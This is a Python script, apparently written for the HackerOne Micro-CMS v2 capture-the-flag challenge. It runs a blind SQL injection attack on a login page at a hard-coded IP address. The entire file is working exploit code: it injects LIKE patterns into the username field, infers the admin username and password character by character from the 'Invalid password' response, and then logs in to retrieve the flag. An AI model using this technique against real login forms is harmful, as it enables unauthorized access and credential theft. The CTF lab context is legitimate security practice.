#!/usr/bin/python3

"""
Used for the hackerone Micro-CMS v2 Capture the Flag challenge.

This script conducts sqlijection on the login page to bruteforce a username
and password one character at a time. This mostly only works because the admin
user has a short/weak password.
"""

import requests
from string import ascii_lowercase, ascii_uppercase, digits, punctuation

# Construct URL
IP = "35.196.135.216"
PORT = "5001"
ROOT_PATH = "a6f0a38229"
LOGIN_PAGE = "http://%s:%s/%s/login" % (IP, PORT, ROOT_PATH)


def inject_uname(uname, passw):
    """
    Perform SQL injection using the username field
    """
    r = requests.post(LOGIN_PAGE, data={"username": uname,
                                        "password": passw})
    return r.text


def get_uname_length():
    placeholders = ""
    while len(placeholders) < 10:
        html = inject_uname("' or username LIKE '%s" % placeholders, "pass")

        if "Invalid password" in html:
            return len(placeholders)

        placeholders += "_"

    return -1


def get_pass_length(username):
    placeholders = ""
    while len(placeholders) < 10:
        html = inject_uname("%s' and password LIKE '%s" %
                            (username, placeholders), "pass")

        if "Invalid password" in html:
            return len(placeholders)

        placeholders += "_"

    return -1


def bruteforce_uname(length):
    uname = ['_'] * length
    possible_chars = ascii_lowercase + ascii_uppercase
    for idx in range(len(uname)):
        for char in possible_chars:
            uname[idx] = char
            html = inject_uname("' or username LIKE '%s" % ''.join(uname),
                                "pass")
            if "Invalid password" in html:
                break
        print("Breaking admin username:", ''.join(uname))

    return ''.join(uname)


def bruteforce_pass(username, length):
    passw = ['_'] * length
    possible_chars = ascii_lowercase + ascii_uppercase + digits + punctuation
    for idx in range(len(passw)):
        for char in possible_chars:
            passw[idx] = char
            html = inject_uname("%s' and password LIKE '%s" %
                                (username, ''.join(passw)),
                                "pass")
            if "Invalid password" in html:
                break
        print("Breaking admin password:", ''.join(passw))

    return ''.join(passw)


if __name__ == "__main__":
    ul = get_uname_length()
    print("Admin uname length: %s" % ul)

    uname = bruteforce_uname(ul)
    print("Admin username:", uname)

    pl = get_pass_length(uname)
    print("Admin password length:", pl)

    passw = bruteforce_pass(uname, pl)
    print("Admin password:", passw)

    # GET THE FLAG!
    flag = inject_uname(uname, passw)
    print("Flag:", flag)
